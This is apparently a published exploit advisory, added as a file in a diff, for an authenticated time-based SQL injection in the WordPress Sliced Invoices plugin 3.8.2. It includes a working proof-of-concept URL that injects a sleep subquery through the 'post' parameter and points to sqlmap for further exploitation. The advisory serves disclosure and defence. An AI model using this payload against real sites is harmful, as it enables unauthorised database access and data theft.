@@ -1,0 +1,19 @@
+# Exploit Title: Wordpress Sliced Invoices 3.8.2 - 'post' SQL Injection
+# Date: 2019-10-22
+# Exploit Author: Lucian Ioan Nitescu
+# Contact: https://twitter.com/LucianNitescu
+# Webiste: https://nitesculucian.github.io
+# Vendor Homepage: https://slicedinvoices.com/
+# Software Link: https://wordpress.org/plugins/sliced-invoices/
+# Version: 3.8.2
+# Tested on: Ubuntu 18.04 / Wordpress 5.3
+ 
+# 1. Description:  
+# Wordpress Sliced Invoices plugin with a version lower then 3.8.2 is affected 
+# by an Authenticated SQL Injection vulnerability.
+
+# 2. Proof of Concept: 
+# Authenticated SQL Injection:
+- Using an Wordpress user, access <your target> /wp-admin/admin.php?action=duplicate_quote_invoice&post=8%20and%20(select*from(select(sleep(20)))a)--%20
+- The response will be returned after 20 seconds proving the successful exploitation of the vulnerability.
+- Sqlmap can be used to further exploit the vulnerability.
